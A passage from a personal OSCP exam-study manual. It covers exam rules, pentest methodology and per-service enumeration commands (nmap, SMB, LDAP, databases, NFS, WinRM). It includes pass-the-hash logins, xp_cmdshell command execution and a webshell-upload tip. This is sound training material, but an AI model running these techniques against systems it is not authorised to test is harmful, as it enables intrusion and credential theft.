---
status: working
tags:
  - stuffs
  - oscp
  - study
  - pen-200
  - cheatsheet
  - field-manual
---
> *OSCP Field Manual:* Landing note for the intact exam-study manual.

This is deliberately kept whole and separate from the discipline notes. Three
things make it a different artifact than a Grimoire note, and all three break if
it is shattered:

1. **It is exam-scoped.** The `[BANNED]`/`[MSF-1]`/`[EXAM-OK]` tags, the
   one-Metasploit-target rule, the proof-and-screenshot discipline, the 70-point
   math. None of that applies to day-job or hobby work, so it is noise inside a
   career-wide note, but essential for the retake.
2. **It is self-routing.** The master routing table and inter-section links only
   work while the sections sit together in one document.
3. **It maps many-to-many.** One section feeds several disciplines, and the
   famous-exploits table scatters by target. There is no clean section→note split.

So the manual is the **exam-prep tool**, and the disciplines are the career-wide
reference it seeded. As you deepen a discipline note, the manual can link down to
it, but the manual itself stays intact.

> [!note]
> The exam-agnostic content already lives, expanded, across the disciplines:
> §2.0 → [[01B - Network Scanning]]; §2.1 → [[03B - Service Enumeration (Ports)]]; §2.2 → [[02B - Web Enumeration]];
> §2.3 → [[09B - Brute Forcing & Spraying]] + [[09C - Hash Cracking]]; §2.4 → [[05D - Finding Credentials]];
> §2.5 → [[03C - SNMP, LDAP, RPC]] + [[00C - Master Routing Table]]; §3 → the *Web & API* notes;
> §4.0 → [[05E - Reverse Shells]]; §4.1 → [[08B - MSFvenom Payloads]]; §4.2 → [[00D - Famous Exploits Lookup]];
> §5 → [[05B - Linux Privilege Escalation]]; §6 → [[05C - Windows Privilege Escalation]];
> §7 → [[03D - AD Enumeration]] + [[03E - AD Attacks]] + [[03F - AD Lateral Movements & Persistence]] + [[11B - Rubeus]] + [[11C - BloodyAD]];
> §7.7 → [[06B - Responder & NTLM Relay]]; §8 → [[05AA - Post-Exploitation Loot Loop]];
> §9 → [[09D - Wordlists & Generation]] + [[00B - References]]; §10 → [[11AAAAA - Tool Map]] + [[11AAA - Environment Setup]] + [[11AA - High-Frequency One-Liners]];
> §11 → [[05F - Shell Stabilization]] + [[05G - File Transfer]] + [[03G - Pivoting & Tunneling]].

# The Actual Field Manual

> [!TODO]
> This was directly pulled from my dedicated vault. It requires some work as it wasn't even finalized then. Work will resume within here, but this may honestly move to a separate sub-folder for course field manuals (e.g., if I take some HackTheBox cert later, I'd likely need a reference manual for that too).

> [!abstract] Scope
> A grep-able, checklist-driven master guide tuned for PEN-200 and the OSCP+ exam (and general CTF/lab boxes). It's *operational*: it tells you not just *how* to run a technique but *when* to reach for it. Excludes real-world confidential engagement data.

> [!info] How to read this manual
> - **Command layout.** Distinct commands each get their own code block so you can copy them one at a time. A short line *before* each block says why you'd run it; a `> [!note]` callout *after* expands the important detail. Pure payload lists (traversal strings, SQLi payloads) stay grouped in one block on purpose.
> - **Routing cues.** Every technique carries a `TRIGGER:` tag — the observable condition that should make you reach for it. The master **[Routing Table](#master-routing-table--finding--next-action)** collapses all triggers into one finding → action lookup. When stuck, go there first.
> - **Exam-legality tags.** `[EXAM-OK]` allowed on all targets · `[MSF-1]` counts as your one Metasploit target · `[BANNED]` prohibited on the exam (lab/CTF only).
> - **Obsidian.** This is a single note; every `§`-style cross-reference is a clickable in-note heading link. Fold sections with the heading gutter; use the outline pane as your table of contents.

> [!tip] Fastest ways to navigate under pressure
> - **Outline pane** (right sidebar) → jump to any numbered section.
> - **`Ctrl+F`** for a literal `TRIGGER:` you're staring at ("SeImpersonate", "no_root_squash", "cpassword").
> - Stuck? → [Master Routing Table](#master-routing-table--finding--next-action). Blank on a whole phase? → [Condensed Master Checklist](#a--condensed-master-checklist-print-this).

---

## Table of Contents

- **[0 — Exam Rules, Mindset & Report Discipline](#0--exam-rules-mindset--report-discipline)**
- **[1 — Methodology (master decision flow)](#1--methodology-master-decision-flow)**
- **[2 — Reconnaissance / Enumeration](#2--reconnaissance--enumeration)**
- **[3 — Web Application Testing → Foothold](#3--web-application-testing--foothold)**
- **[4 — Initial Access / Exploitation](#4--initial-access--exploitation)**
- **[5 — Privilege Escalation: Linux](#5--privilege-escalation-linux)**
- **[6 — Privilege Escalation: Windows](#6--privilege-escalation-windows)**
- **[7 — Active Directory Attacks](#7--active-directory-attacks)**
- **[8 — Post-Exploitation](#8--post-exploitation)**
- **[9 — Wordlists, Payloads & Resources](#9--wordlists-payloads--resources)**
- **[10 — Tools, Setup & Command Reference](#10--tools-setup--command-reference)**
- **[11 — Networking, Pivoting & Data Transfer](#11--networking-pivoting--data-transfer)**
- **[A — Condensed Master Checklist (print this)](#a--condensed-master-checklist-print-this)**

---

# 0 — Exam Rules, Mindset & Report Discipline

## 0.0 — Exam structure (OSCP+, current as of the April 2026 guide)

- **3 stand-alone machines — 60 pts** (20 each: 10 initial access + 10 privesc).
- **1 AD set of 3 machines — 40 pts** (10 + 10 + 20). You're **given a domain user+password** — a breach-simulation start.
- **70 pts to pass.** Common passing lines: `40 AD + 3 local.txt`, or `40 AD + 2 local.txt + 1 proof.txt`, or `20 partial-AD + 3 local.txt + 2 proof.txt`, or `10 AD + 3 fully-owned standalones`.
- **23h45m** hacking window, then **24h** to submit the report.
- Proctored. **24 reverts** (one reset allowed). Report grades machines in the order you document them.

> [!warning] "Partial AD" scores differently than you'd hope
> AD points come from **owning machines in the set**, but the full 40 requires the **whole domain**. Compromising boxes without owning the domain = partial credit only. Two clean passing lines to keep in your head: **Full AD (40) + 3 `local.txt` (30) = 70**, or **partial AD (20) + 3 `local.txt` + 2 `proof.txt` (50) = 70**. `No AD + 3 full standalones = 60 = FAIL.`

## 0.1 — Tool restrictions — READ THIS, it cost you before

| Tool | Status | Notes |
|---|---|---|
| Nmap (+ NSE), Nikto, Burp **Free**, feroxbuster/gobuster/ffuf, dirb | `[EXAM-OK]` | The scripting engine is fine, including `vuln` NSE scripts |
| **sqlmap**, sqlninja, any automatic exploitation tool | `[BANNED]` | Do SQLi **by hand** ([§3](#3--web-application-testing--foothold)). Hard DQ for that target. |
| **Burp Suite Pro**, Metasploit **Pro**, Cobalt Strike, commercial tools | `[BANNED]` | Free/community editions only |
| Nessus, OpenVAS, Nexpose, Canvas, Core Impact, SAINT | `[BANNED]` | NSE `vuln` scripts and Nikto are the allowed substitutes |
| **db_autopwn / browser_autopwn** | `[BANNED]` | Any mass/auto-exploitation is out |
| **Spoofing** (IP/ARP/DNS/NBNS) + **Responder poisoning** | `[BANNED]` | Responder is allowed for **analysis only** — no active poisoning/spoofing |
| **AI chatbots** (ChatGPT/Gemini/Claude/Copilot/OffSec KAI/etc.) | `[BANNED]` | Considered third-party help — academic violation |
| **Metasploit** modules (auxiliary/exploit/post) + **Meterpreter** | `[MSF-1]` | See below — stricter than most remember |
| `msfvenom` + `exploit/multi/handler` | `[EXAM-OK]` | Exempt; usable against **all** targets |

> [!warning] The Metasploit one-target rule (memorize this)
> - You may use MSF modules or Meterpreter against **exactly one** machine of your choice.
> - **Using `check` counts.** You cannot probe multiple machines with MSF before "selecting" one — first use locks you in.
> - **If your MSF attempt fails on that machine, you're still locked** — you may not move MSF to a second target.
> - **MSF cannot be used for pivoting** (that would touch a second host).
> - Only `msfvenom` and `multi/handler` escape the limit.
> - **Practical stance:** treat MSF as a break-glass tool for the *one* box you can't crack manually. Everything else is manual.

> [!danger] Responder on the exam
> Responder is on the *allowed* list **but only for passive analysis** — LLMNR/NBT-NS/mDNS **poisoning and spoofing are explicitly banned** (they're a spoofing technique). The capture-hashes-on-the-wire workflow in this manual is a **lab/AD-practice** technique; on the exam, treat any Responder use that answers/poisons as prohibited. Tagged `[BANNED-EXAM]` where it appears.

## 0.2 — Proof & report discipline (where points silently vanish)

This is the part that turns real hacking into real points:

- **Submit every `local.txt` / `proof.txt` in the control panel *before* the exam clock ends.** The panel won't confirm correctness — submit anyway. Forgetting = zero for that machine even if owned.
- **Screenshot each flag** showing (a) contents via `type`/`cat` **from its original location**, and (b) the target IP in the *same frame* (`ip addr` / `ipconfig` / `ifconfig`).
- **Interactive shell only.** A flag read through a web shell, or copied any other way, scores **zero**. Get a real shell first.
- **Windows full points** = shell as SYSTEM / Administrator / admin-privileged user. **Linux full points** = root shell.
- **Exploit code in report:** unmodified → cite URL only. Modified → include modified code + original URL + shellcode-gen command + highlighted changes + why.
- **Report format:** PDF `OSCP-OS-XXXXX-Exam-Report.pdf`, archived to a **password-less** `.7z` of same name, ≤200 MB, uploaded to `upload.offsec.com`. Verify MD5 after upload and click **Submit File**.
- `proof.txt` lives in `/root/` or Administrator's Desktop; `local.txt` is readable by the unprivileged user. Control panel says which boxes have which.
- **Report templates:** OffSec's official one, or the community **whoisflynn** / **CPTC** templates — pick one and pre-fill your details before the exam (see [§9.2](#92--reference-sites-bookmark--offline-copies-where-possible)).

> [!warning] Screenshot-as-you-go
> Capture the proof screenshot the *instant* you get the shell — before looting, before continuing privesc. Boxes get reverted and sessions die. A flag you saw but didn't screenshot is worth nothing.

## 0.3 — The OSCP mindset (anti-rabbit-hole)

The exam rewards **exhaustive enumeration and the boring path**, not clever one-offs. Your first attempt failed on methodology, not skill.

- **The intended path is almost always mundane.** Default creds, a password in a file, a public CVE, `SeImpersonate`→Potato, Kerberoast. Reaching for SSTI, deserialization chains, or exotic vulns → **you're probably in a rabbit hole.** Note it, back out.
- **Enumeration is a loop, not a phase.** Every new credential/file/foothold resets you to [§2](#2--reconnaissance--enumeration) *from the new vantage point*. "I have a shell" = "re-enumerate as this user."
- **Breadth before depth.** Triage *all* targets before deep-diving one.
- **Time-box.** No movement in ~30–45 min → park the vector, rotate. Fresh eyes beat grinding.
- **Notes discipline.** `tmux` + a per-host notes file. If you can't reproduce it, it didn't happen.

**Indicative time budget:**
| Block | Target |
|---|---|
| Full enum sweep of all targets | first 60–90 min |
| Per standalone box | ~2–4 h, rotate on stall |
| AD set (foothold → DC) | 4–8 h, treated as one chain |
| Buffer + report screenshots | keep 2 h in reserve |

## 0.4 — Pre-exam setup checklist (the night before)

- [ ] **Kali** up to date, latest VMware/VirtualBox image, snapshot taken.
- [ ] **Screen share uses Xorg/X11, NOT Wayland** — Wayland breaks the proctor screen-share. (`echo $XDG_SESSION_TYPE` should say `x11`.)
- [ ] Webcam + browser with Janus plugin tested; stable connection.
- [ ] OpenVPN tested. VPN pack arrives **at exam start**, not before: `tar xvfj exam-connection.tar.bz2` then `sudo openvpn OS-XXXXXX-OSCP.ovpn`. Reset with `sudo killall openvpn` if it wedges.
- [ ] `/opt/tools` pre-stocked and transfer-ready: linpeas, winpeas, the Potatoes, SharpHound.exe, Rubeus.exe, chisel (both OS), ligolo agent+proxy, mimikatz, PowerView, nc.exe, static impacket. (See [§10.4](#104--setup-proxychains--reusable-listeners).)
- [ ] Wordlists unpacked (`gunzip rockyou.txt.gz`), SecLists installed.
- [ ] BloodHound CE Docker tested and starting cleanly ([§10.3](#103--setup-bloodhound-ce-the-one-that-trips-people-up)).
- [ ] Obsidian vault open with this manual + a blank per-host notes template; screenshot tool (Flameshot) bound to a hotkey with a known save dir.
- [ ] Report template pre-filled (name/OSID) and ready.
- [ ] Sleep. Don't cram — methodology beats last-minute facts.

---

# 1 — Methodology (Master Decision Flow)

**Scope.** A repeatable framework so nothing gets skipped under pressure. This is the spine; every other section is a limb.

- **1. Recon every target first ([§2](#2--reconnaissance--enumeration))**
  - Host discovery across the subnet → per-host: full TCP (`-p-`) → top UDP → version/script scan.
  - Goal: a service+version inventory for *every* box before exploiting anything.
- **2. Triage each service ([Routing Table](#master-routing-table--finding--next-action))**
  - For every open port ask: *does this give a version (→ searchsploit) or an interface to test creds against (→ spray)?*
  - Map each service to a candidate path. Write it down. Don't commit yet.
- **3. Get a foothold (lowest-effort path first)**
  - Try the *simple* things across all boxes before the clever ones:
    - Default/blank creds on any login, DB, or service.
    - Anonymous FTP / null SMB / NFS exports → loot for creds & keys ([§2.4](#24--file--share-enumeration)).
    - Web: obvious SQLi auth bypass, exposed admin panel, upload form, LFI ([§3](#3--web-application-testing--foothold)).
    - A public exploit matching a version string ([§4](#4--initial-access--exploitation), [§3.5](#35--known-cve-triage)).
  - Only after those: manual injection chains, custom exploitation.
- **4. Land & stabilize ([§11](#11--networking-pivoting--data-transfer))**
  - Upgrade shell to a PTY, set `TERM`, confirm Ctrl-C survives.
  - **Grab `local.txt` immediately + screenshot with IP ([§0.2](#02--proof--report-discipline-where-points-silently-vanish)).**
- **5. Local privilege escalation**
  - **Linux → [§5](#5--privilege-escalation-linux)** · **Windows → [§6](#6--privilege-escalation-windows).**
  - Run the enum script *and* manually check the top quick-wins in parallel.
  - Windows: **`whoami /priv` is the first command.** Impersonate privilege → Potato → SYSTEM.
  - **Grab `proof.txt` + screenshot with IP.**
- **6. Is this a domain machine?**
  - **No** → next target, back to step 1.
  - **Yes** (port 88/389, domain-joined) → [§7](#7--active-directory-attacks).
- **7. Active Directory chain ([§7](#7--active-directory-attacks)) — treat all 3 boxes as one objective**
  - Enumerate ([7.0](#70--ad-enumeration)) → credential attacks ([7.1](#71--credential-attacks)) → lateral movement ([7.2](#72--lateral-movement)) → credential access / DCSync ([7.3](#73--credential-access--domain-compromise)) → own the DC.
- **8. Post-ex & pivot ([§8](#8--post-exploitation), [§11](#11--networking-pivoting--data-transfer))**
  - Loot every host; feed new creds back into step 7 (and step 1 for standalones).
  - New subnet reachable only from this host? Tunnel ([§11](#11--networking-pivoting--data-transfer)) and recurse from step 1.

> [!note] Decision checkpoints (ask constantly)
> - After scan: *service+version known for every open port?* No → [§2.1](#21--service-enumeration-per-port-playbooks) first.
> - Before exploiting: *is there a simpler path I'm skipping?*
> - On **any** credential: *have I sprayed it against every host and protocol?* ([§2.3](#23--credential-enumeration))
> - On **any** shell: *ran the enum script + checked top-5 quick wins?*
> - On **any** Windows box: *`whoami /priv` — do I have an impersonate token?*
> - On stall (30–45 min): *rotate.* Note the parked vector.

> [!tip] The two failure modes this manual is built to kill
> 1. **Privesc stalls** — you never escalated last time. Fix: [§5](#5--privilege-escalation-linux)/[§6](#6--privilege-escalation-windows) are *rituals you run top-to-bottom*, not menus you cherry-pick. Run the enum script AND the manual quick-wins every single time.
> 2. **AD stalls after the given creds** — you never sprayed or roasted. Fix: the moment you hold any credential, the [§7.5 checklist](#75--ordered-attack-checklist-if-you-have-x-do-y) is mandatory: spray → BloodHound → AS-REP → Kerberoast, in that order.

---

# 2 — Reconnaissance / Enumeration

**Scope.** Identify and enumerate hosts, services, apps, and attack surface. Most exam failures are *enumeration* failures.

## 2.0 — Network Scanning (Nmap / rustscan / masscan)

**TRIGGER:** Always. First contact with any target/subnet. Stage your scans — never one giant blocking scan. Set the target once so every command is copy-paste-safe:

```bash
export IP=10.10.10.10
mkdir -p nmap
```

### Fast full-TCP sweep — which ports are open at all?

Run this first. It skips scripts and version detection for raw speed, so you learn the open-port set in a minute or two instead of waiting on a slow all-in-one scan.

```bash
nmap -p- --min-rate 10000 -T4 $IP -oN nmap/allports.txt
```

> [!note]
> - `-p-` scans all 65535 TCP ports. On the exam, **never** settle for the default top-1000 — intended paths hide on high ports.
> - `--min-rate 10000` forces a floor of 10k packets/sec. Aggressive but fine on a lab LAN; you'd throttle this on a real engagement.
> - `-T4` is the timing template (controls parallelism and timeouts). `-T5` only on very stable networks or you'll drop results.
> - `-oN` writes normal (human-readable) output. Swap for `-oA nmap/all` to also save `.gnmap` and `.xml` for later parsing/reporting.

### Deep scan — but only the ports you found

Pull the open ports out of the first scan and run version/script/OS detection against just those. Scanning only open ports keeps this second (slower) pass fast.

```bash
ports=$(grep -oP '^\d+(?=/tcp\s+open)' nmap/allports.txt | paste -sd,)
nmap -p$ports -sC -sV -O -oN nmap/deep.txt $IP
```

> [!note]
> - `-sV` (service/version detection) is the single most important flag for triage — the version string is what you feed to `searchsploit`.
> - `-sC` runs the default NSE script set (safe, high-signal — banners, titles, anonymous-access checks).
> - `-O` is OS detection (needs root). `-A` is the heavier all-in-one alternative (`-sC -sV -O --traceroute`); fine on the exam if you prefer one flag.

### NSE vuln scan — the allowed substitute for banned scanners `[EXAM-OK]`

Automated vuln *scanners* (Nessus/OpenVAS) are banned, but Nmap's `vuln` script category is allowed and catches the classic exam CVEs.

```bash
nmap -p$ports --script vuln -oN nmap/vuln.txt $IP
```

> [!note]
> - Flags well-known issues like `smb-vuln-ms17-010` (EternalBlue) and various `http-*` checks.
> - Narrow it when you know the surface: `--script "smb-vuln-*"` or `--script "http-enum"`.

### UDP scan — the step everyone forgets

UDP services don't show in TCP scans, and forgetting them (SNMP, TFTP, NFS) costs people hours. Scan the top UDP ports only — full UDP is far too slow.

```bash
sudo nmap -sU --top-ports 100 -T4 -oN nmap/udp.txt $IP
```

> [!note]
> - Watch for **53** DNS, **69** TFTP, **123** NTP, **161** SNMP, **500** IKE, **2049** NFS.
> - Routing: **161 open → [§2.5 SNMP](#snmp--161udp)**, **2049 → [§2.4 NFS](#mount-and-read-nfs-exports)**, **69 → tftp get/put**.

### Subnet host discovery (internal / after a pivot)

Once you're inside a new network (e.g. through a pivot), find live hosts before scanning each one.

```bash
nmap -sn 10.10.10.0/24 -oN nmap/hostsweep.txt
```

> [!note]
> `-sn` is a ping sweep with no port scan — fast way to map what's alive in the subnet. Internal AD ranges: also try `fping -asgq 172.16.5.0/23` for a quick sweep (HTB-cheatsheet idiom).

### Handy Nmap flags (reference)

Keep these in your back pocket; they solve specific problems rather than being part of the standard flow.

```bash
-Pn            # skip host discovery — use when a box you KNOW is up shows "host down" (ICMP filtered)
-sT            # TCP connect scan — REQUIRED through proxychains (§11); -sS won't work over SOCKS
--top-ports N  # scan the N most common ports (fast triage)
-sV --version-intensity 9   # squeeze harder on stubborn version detection
--open         # only show open ports in output
-6             # scan an IPv6 target
-A -iL hosts.txt -oN out    # OS+version+script+traceroute across a host LIST (internal sweep)
```

### rustscan — fastest full-port sweep, hands off to nmap

Use when `nmap -p-` feels slow. rustscan finds the open ports at speed, then pipes them straight into nmap for version/script detection.

```bash
rustscan -a $IP --range 1-65535 --ulimit 5000 -- -sC -sV -oN nmap/rustscan.txt
```

> [!note]
> - `--ulimit 5000` raises the open-socket limit so it actually runs fast — the most common "why is rustscan slow" gotcha.
> - Everything after `--` is passed straight through to nmap.

### masscan — very fast discovery across large ranges

Use for wide subnet sweeps or when you want raw port discovery at maximum speed. It finds ports fast but does **no** version detection — always nmap the hits afterward.

```bash
sudo masscan -p1-65535 $IP --rate=1000 -oL nmap/masscan.txt
```

> [!tip] Rule of thumb
> - `--rate` is packets/sec (1000 is safe on a lab; go higher on a big range you own).
> - Spray a few ports across a whole subnet: `sudo masscan 10.10.10.0/24 -p80,443,445 --rate=10000`.
> - Use rustscan/masscan for *discovery speed*, nmap `-sCV`/`--script vuln` for *depth*. On the exam, `nmap -p- --min-rate 10000` alone is usually enough and keeps you in one tool.

## 2.1 — Service Enumeration (per-port playbooks)

**TRIGGER:** every open port from [§2.0](#20--network-scanning-nmap--rustscan--masscan). Each service must yield *a version* (→ searchsploit) or *an interface to test creds against* (→ [§2.3](#23--credential-enumeration)). If it gives neither yet, you haven't enumerated it enough.

### FTP — 21

`TRIGGER:` port 21 open → always try anonymous first; it's a free win when it lands.

Grab the banner (the version feeds `searchsploit`):
```bash
nc -nv $IP 21
```
Try an anonymous login (creds are literally `anonymous` / `anonymous`, or blank):
```bash
ftp $IP
```
Mirror everything if you get in:
```bash
wget -m --no-passive ftp://anonymous:anonymous@$IP
```

> [!note] In-session FTP commands worth memorizing
> - `status` — show transfer mode
> - `binary` / `ascii` — set mode; **use `binary` before pulling executables/archives or they corrupt**
> - `ls -la`, `cd`, `get <file>`, `mget *`, `put <shell>`
> - `!ls` — run a local command without leaving the session
> - If passive transfers hang, toggle with `passive`

> [!tip] Key pivot
> If the FTP root is *writable* and turns out to be the web root, upload a webshell and browse to it (→ [§3](#3--web-application-testing--foothold)). Always check whether an anonymous-writable FTP maps to a served web directory.

### SSH — 22

`TRIGGER:` you have credentials or a private key. SSH itself is rarely the vulnerability — it's how you *use* creds you found elsewhere.

Standard login (the two options suppress host-key prompts that waste time):
```bash
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" user@$IP
```
Login with a recovered private key:
```bash
ssh -i id_rsa user@$IP
```
Crack a passphrase-protected key:
```bash
ssh2john id_rsa > id_rsa.hash && john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

> [!note]
> - `chmod 600 id_rsa` before using a recovered key or SSH refuses it as "too open."
> - If the key is encrypted, `ssh2john` converts it to a crackable hash; a cracked passphrase then unlocks the key for login.

### SMTP — 25 / 465 / 587

`TRIGGER:` port 25 open → enumerate valid usernames, which feed spraying ([§2.3](#23--credential-enumeration)) and AD attacks ([§7](#7--active-directory-attacks)).

Banner + manual interaction:
```bash
nc -nv $IP 25
```
Automated user enumeration:
```bash
smtp-user-enum -M VRFY -U users.txt -t $IP
```
The raw SMTP verbs (type these inside the `nc` session):
```smtp
HELO x
VRFY root            -- 250/252 = user exists, 550 = no
EXPN <list>          -- expand a mailing list to members
RCPT TO:<user>       -- alternate user-existence check
```

> [!note]
> - `-M VRFY` uses the VRFY verb; `RCPT` and `EXPN` are fallback methods if VRFY is disabled.
> - Swaks is the scriptable option for open-relay testing / sending: `swaks --to user@corp.com --from x@x --server $IP`.

### DNS — 53

`TRIGGER:` port 53 open, or you learn a domain name. A zone transfer can hand you the whole internal host list at once.

Attempt a zone transfer:
```bash
dig axfr @$IP <domain>
```
Broader automated enumeration:
```bash
dnsenum <domain>
```
Map a nameserver / discover DC hostnames (AD idiom):
```bash
nslookup ns1.<domain> $IP
```

> [!note]
> - Zone transfers are usually blocked, but always try — when they work, they're a goldmine of hostnames.
> - Add any hostnames you discover to `/etc/hosts` so name-based vhosts resolve ([§2.2](#22--web-enumeration)).

### HTTP / HTTPS — 80 / 443 / 8080 / 8443 / …

`TRIGGER:` any web port → go to **[§2.2](#22--web-enumeration)**. Web is the most common foothold surface, so it gets its own subsection.

### Kerberos — 88

`TRIGGER:` port 88 open means **this host is a Domain Controller.** Go to **[§7](#7--active-directory-attacks)** and treat the whole AD set as one objective.

### RPC / NetBIOS / SMB — 111 / 135 / 139 / 445

`TRIGGER:` 139/445 open → full SMB enumeration. This is a huge exam surface (shares, users, null sessions, EternalBlue).

Protocol/signing/share overview via NSE:
```bash
nmap -p445 --script "smb-protocols,smb2-security-mode,smb-os-discovery,smb-enum-shares,smb-vuln-*" $IP
```
Quick OS/domain/signing glance:
```bash
crackmapexec smb $IP
```
Null-session share permissions:
```bash
crackmapexec smb $IP -u '' -p '' --shares
```
Kitchen-sink enumeration (users, shares, groups, password policy):
```bash
enum4linux-ng -A $IP
```
List shares over a null session:
```bash
smbclient -L //$IP/ -N
```
Show READ/WRITE per share:
```bash
smbmap -H $IP -u '' -p ''
```
Connect to and loot a share:
```bash
smbclient //$IP/share -N
```
RID-cycle usernames when null share-listing is blocked:
```bash
crackmapexec smb $IP -u guest -p '' --rid-brute
```

> [!example] Authenticated SMB — the workflow you forgot last exam
> Once you have a credential, re-run everything *authenticated* — you'll see shares and files the null session couldn't.
> ```bash
> # list shares as a user (domain optional)
> smbclient -L //$IP/ -U 'CORP/forend%Klmcargo2'
> ```
> ```bash
> # connect to a specific share authenticated, then loot interactively
> smbclient //$IP/Dev-share -U 'forend%Klmcargo2'
> ```
> ```bash
> # map ALL shares + per-share R/W perms with creds
> smbmap -u forend -p Klmcargo2 -d CORP.LOCAL -H $IP
> ```
> ```bash
> # recursive directory-only listing of one share (find interesting paths fast)
> smbmap -u forend -p Klmcargo2 -d CORP.LOCAL -H $IP -R SYSVOL --dir-only
> ```
> ```bash
> # CME: enumerate shares / spider readable files with creds
> crackmapexec smb $IP -u forend -p Klmcargo2 --shares
> crackmapexec smb $IP -u forend -p Klmcargo2 -M spider_plus --share 'Dev-share'
> ```
> Inside `smbclient`: `recurse ON; prompt OFF; mget *` pulls a share recursively. `smbmap`'s perm column tells you instantly where you can **write** (webshell/upload angle).

> [!note]
> - `-N` means "null session" (no password). `--rid-brute` walks RIDs to recover usernames even when you can't list shares.
> - **SMB signing disabled** in the nmap output signals relay potential (lab/AD context).
> - If `smb-vuln-ms17-010` flags → EternalBlue path ([§4](#4--initial-access--exploitation)).
> - Users found → [§2.3](#23--credential-enumeration) (spray). Readable/writable share → [§2.4](#24--file--share-enumeration) (loot).

> [!tip] Run several — they disagree
> `crackmapexec` → `smbmap` → `smbclient` → `enum4linux-ng`. Each tool sees slightly different shares/permissions; when one comes up empty, another often doesn't. For deeper RPC-based user/group enumeration, see the **[rpcclient reference](#rpc--135--139--593)** in §2.5.

### LDAP — 389 / 636 / 3268 / 3269

`TRIGGER:` port 389 open (usually a DC). Anonymous bind sometimes dumps the directory. Full LDAP command reference lives in **[§2.5](#ldap--389--636--3268--3269-command-reference)**; the short version:

Anonymous full dump:
```bash
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=com"
```

> [!note]
> See [§2.5 LDAP](#ldap--389--636--3268--3269-command-reference) for the base-DN discovery step, the authenticated user filter, and the `description`/`info` attribute hunt (creds hide there). Then continue in [§7](#7--active-directory-attacks).

### MSSQL — 1433

`TRIGGER:` port 1433 open. If you get in as a privileged DB user you can often go straight to command execution.

Test creds:
```bash
crackmapexec mssql $IP -u sa -p '<pw>' --local-auth
```
Interactive client:
```bash
impacket-mssqlclient sa:'<pw>'@$IP -windows-auth
```

> [!note]
> - Inside the client, `enable_xp_cmdshell` (or `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`) turns on command execution, then `xp_cmdshell 'whoami'` runs OS commands.
> - That command runs as the SQL service account, which very often holds `SeImpersonate` → straight to [§6](#6--privilege-escalation-windows) for a SYSTEM escalation.

### MySQL / MariaDB — 3306

`TRIGGER:` port 3306 open. Default/blank `root` is common; MariaDB is a drop-in fork and behaves identically here.

Connect (prompts for password):
```bash
mysql -h $IP -u root -p
```
Connect passing the password inline (no space after `-p`):
```bash
mysql -h $IP -u root -pPassword123
```
Once connected, the enumeration sequence:
```sql
SHOW DATABASES;
USE <db>;
SHOW TABLES;
DESCRIBE <table>;
SELECT * FROM users;
SELECT user,authentication_string FROM mysql.user;   -- dump credential hashes
SELECT @@version; SELECT @@secure_file_priv;         -- version + whether file-write is allowed
SELECT @@datadir;                                    -- where the DB lives
```

> [!note]
> - `mysql.user` holds account hashes you can crack offline ([§2.3](#23--credential-enumeration)).
> - `secure_file_priv` empty/NULL means `LOAD_FILE`/`INTO OUTFILE` are usable (file read/write).

### PostgreSQL — 5432

`TRIGGER:` port 5432 open. Try default creds `postgres:postgres` first.

Connect:
```bash
psql -h $IP -U postgres
```
Connect to a specific DB with an inline password:
```bash
psql "host=$IP user=postgres password=postgres dbname=postgres"
```
psql meta-commands (backslash commands) — the enumeration menu:
```psql
\l            -- list databases
\c <db>       -- connect to a database
\dt           -- list tables
\du           -- list roles/users (look for Superuser)
\d <table>    -- describe table
SELECT * FROM pg_shadow;   -- password hashes (if superuser)
SELECT version();
```

> [!note]
> If your role is **Superuser**, `COPY ... FROM PROGRAM` gives command execution — the standard Postgres RCE path (documented on HackTricks).

### NFS — 2049

`TRIGGER:` port 2049 open (or 111 rpcbind). Mountable exports can leak files or enable a root escalation.

List exports:
```bash
showmount -e $IP
```
Mount one:
```bash
sudo mount -t nfs $IP:/export /tmp/nfs -o nolock
```

> [!note]
> - An export marked `no_root_squash` is the prize: files you create as root on *your* box keep root ownership on the share, which enables a local-root technique on the target (worked example in [§5.2](#52--nfs-no_root_squash-worked-exploit)).
> - Even without that, mounted exports often contain SSH keys, configs, and backups ([§2.4](#24--file--share-enumeration)).

### RDP 3389 / WinRM 5985 / VNC 5900 (creds-in-hand services)

`TRIGGER:` these turn a found credential into access.

RDP GUI session:
```bash
xfreerdp /v:$IP /u:user /p:pass +clipboard /dynamic-resolution /cert:ignore
```
WinRM shell with a password:
```bash
evil-winrm -i $IP -u user -p 'pass'
```
WinRM shell with an NTLM hash (pass-the-hash):
```bash
evil-winrm -i $IP -u user -H <NTLM>
```
evil-winrm with a script/exe upload directory pre-loaded:
```bash
evil-winrm -i $IP -u user -p 'pass' -s /opt/scripts/ -e /opt/exes/
```

> [!note] evil-winrm built-ins (type at its prompt)
> - `upload <local> <remote>` / `download <remote> <local>`
> - `menu` lists loaded functions
> - With `-s`, `Invoke-Binary` / dot-source PowerShell scripts (PowerView, Rubeus) straight into memory.
> - **WinRM (5985) + valid creds/hash is one of the easiest shells on the exam** — always test it when you have a Windows credential.
> - `+clipboard` and `/dynamic-resolution` make the RDP session usable; `/cert:ignore` skips the self-signed cert prompt.

## 2.2 — Web Enumeration

**TRIGGER:** any HTTP/S port. The most common foothold surface, so enumerate it thoroughly before assuming it's a dead end.

### Fingerprint before fuzzing

Know what you're attacking before you brute-force anything. The tech stack decides which extensions to fuzz and which exploits apply.

Identify the stack and headers:
```bash
whatweb http://$IP
```
Pull headers directly (server, redirects, cookies):
```bash
curl -sI http://$IP
```
Quick vuln/misconfig sweep `[EXAM-OK]`:
```bash
nikto -h http://$IP
```

> [!note]
> - Also just *browse the site* and view source — read `robots.txt` and `sitemap.xml`, and note every login page and upload form (those are your two highest-value targets).
> - `curl -s http://$IP | grep -iE 'generator|powered|version|comment'` often surfaces a framework/version string hiding in the HTML.
> - Custom or empty-looking app? **Inspect element / view-source every page** and watch Burp for POST requests, cookies, and hidden parameters (HTB-cheatsheet habit).

### Directory / file discovery

Find hidden paths — admin panels, backups, dev files. Match the `-x` extensions to the stack you fingerprinted or you'll miss the interesting files. **Brute-force in the background while you manually browse.**

Primary (feroxbuster, recursive by default):
```bash
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -t 50
```
Fallback (gobuster):
```bash
